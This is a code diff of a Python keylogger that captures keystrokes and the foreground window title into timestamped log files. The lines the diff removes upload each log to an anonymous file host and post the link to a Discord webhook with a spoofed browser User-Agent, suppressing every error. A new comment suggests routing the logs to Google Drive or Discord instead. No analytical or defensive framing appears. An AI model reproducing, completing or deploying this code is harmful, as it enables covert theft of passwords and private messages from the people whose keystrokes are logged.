@@ -3,7 +3,6 @@ import pynput, threading, win32api, time, anonfile, os, win32gui, unidecode, jso
 loggedKeys = "" 
 storedKey = ""
 activeWindow = win32gui.GetWindowText(win32gui.GetForegroundWindow())
-webhook = "WEBHOOK HERE"
 
 def mouseget():
     global loggedKeys 
@@ -23,16 +22,7 @@ def send():
             with open(f"log_{timenow}.txt", "w") as f:
                 f.write(loggedKeys)
 
-            try:
-                headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
-                payload = json.dumps({'content': "@everyone " + anonfile.AnonFile().upload(f"log_{timenow}.txt", progressbar=False).url.geturl()})
-            except: pass
-
-            try:
-                req = urllib.request.Request(webhook, data=payload.encode(), headers=headers)
-                urllib.request.urlopen(req)
-                loggedKeys = ""
-            except: pass
+            # here you want to send the txt file somewhere. Maybe connect it to Google Drive or connect it to Discord via webhook?
             
             os.remove(f"log_{timenow}.txt")
         except: pass
